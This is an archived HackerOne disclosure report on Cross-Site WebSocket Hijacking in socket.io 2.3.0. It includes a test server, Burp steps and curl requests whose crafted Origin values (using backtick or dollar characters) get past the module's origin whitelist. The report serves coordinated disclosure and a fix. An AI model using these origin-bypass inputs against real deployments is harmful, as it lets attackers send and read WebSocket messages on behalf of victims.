---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
  - stack/node
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
body: true
date: 2021-01-31
submitted: 2020-07-22T12:04:27.685Z
bounty_usd: null
votes: 27
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "sh1yo"
source: "https://hackerone.com/reports/931197"
title: "[socket.io] Cross-Site Websocket Hijacking "
---
# [socket.io] Cross-Site Websocket Hijacking 

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 27 | **Program:** Node.js third-party modules | **Disclosed:** 2021-01-31

- Report: [https://hackerone.com/reports/931197](https://hackerone.com/reports/931197)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2020-07-22T12:04:27.685Z

## Report summary

-

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Cross-Site Websocket Hijacking in `socket.io`
It allows an attacker to bypass origin protection using special symbols include "`" and "$"

# Module

**module name:** `socket.io`
**version:** `2.3.0`
**npm page:** `https://www.npmjs.com/package/socket.io`

## Module Description

> Socket.IO enables real-time bidirectional event-based communication

## Module Stats

[1] weekly downloads: 3,457,682

# Vulnerability

## Vulnerability Description

I found this vulnerability while testing one of the private bugbounty programs. This vulnerability can be exploited as a typical csrf vulnerability. An attacker can send and receive WebSocket messages on behalf of a user.

## Steps To Reproduce:

- `npm install socket.io expressjs`
- Put the following code in to `index.js`

```
var app = require('express')();
var http = require('http').createServer(app);
var io = require('socket.io')(http);

io.origins(['http://localhost:80']); //we believe that this module will decline other origins

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

io.on('connection', (socket) => {
  console.log('a user connected');
});

http.listen(80, () => {
  console.log('listening on *:80');
});
```
- Put the following code in to `index.html`
````
<script src="/socket.io/socket.io.js"></script>
        <script>
                var socket = io();
        </script>
```

- Run it `sudo node index.js`
- Open the burpsuite and navigate to http://localhost
- Open the proxy tab and send following request to repeater - `GET /socket.io/?EIO=3&transport=websocket&sid={{random id}}`
- Run it. We see `HTTP/1.1 101 Switching Protocols`

{F916713}

It means that the connection was successful.

- Try to change origin to `something.io`, we will see `HTTP/1.1 400 Bad Request` and it is good, because we allowed only localhost origin in our index.js

{F916722}

- Now try to change origin to
```localhost`something.io```

{F916727}

As we can see - the module thinks that origin is localhost while Safari thinks that it is a subdomain of something.io. Also, as I identified Safari isn't the only affected browser - this also works on modern firefox `Mozilla Firefox 79.0b8` as well. Try to change Origin to `http://localhost$something.io` The application still thinks that origin is localhost while firefox thinks that it is a domain `http://localhost$something.io` (During my small research I identified that firefox allows $ in domains names). 


## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- Os: Linux arch 5.7.9-arch1-1
- Node: v14.5.0
- NPM: 6.14.6
- Mozilla Firefox 79.0b8

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] N
- I opened an issue in the related repository: [Y/N] N

## Impact

After the successful connection from the attacker's domain, the attacker can receive and send websocket messages on behalf of a user.

## Timeline

- **Report Filed**
- **2020-08-03** @sh1yo: I've been notified that sometimes it is not convenient for you to use BurpSuite, so here are reproduction steps with curl:

-  Send the following curl request:

`curl -v "http://localhost:80/socket.io/?EIO=3&transport=websocket" -H "Sec-WebSocket-Version: 13"  -H "Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==" -H "Upgrade: websocket" -H "Sec-WebSocket-Extensions: permessage-deflate" -H "Host: localhost" -H "Connection: keep-alive, Upgrade" -H "Origin: http://localhost"`

You will see curl output with `HTTP/1.1 101 Switching Protocols` in the response.

- Now change the origin and send yet one request:

`curl -v "http://localhost:80/socket.io/?EIO=3&transport=websocket" -H "Sec-WebSocket-Version: 13"  -H "Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==" -H "Upgrade: websocket" -H "Sec-WebSocket-Extensions: permessage-deflate" -H "Host: localhost" -H "Connection: keep-alive, Upgrade" -H "Origin: http://not-localhost"`

You will see that the server rejected the request with `HTTP/1.1 400 Bad Request`.

- Now change the origin header to something like `localhost$not-localhost`:

`curl -v "http://localhost:80/socket.io/?EIO=3&transport=websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: 7fhAFB4aUGBFRJ0p0dDfTg==" -H "Upgrade: websocket" -H "Sec-WebSocket-Extensions: permessage-deflate" -H "Host: localhost" -H "Connection: keep-alive, Upgrade" -H "Origin: http://localhost\$not-localhost"`

You again will see `HTTP/1.1 101 Switching Protocols` despite the origin is not localhost.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
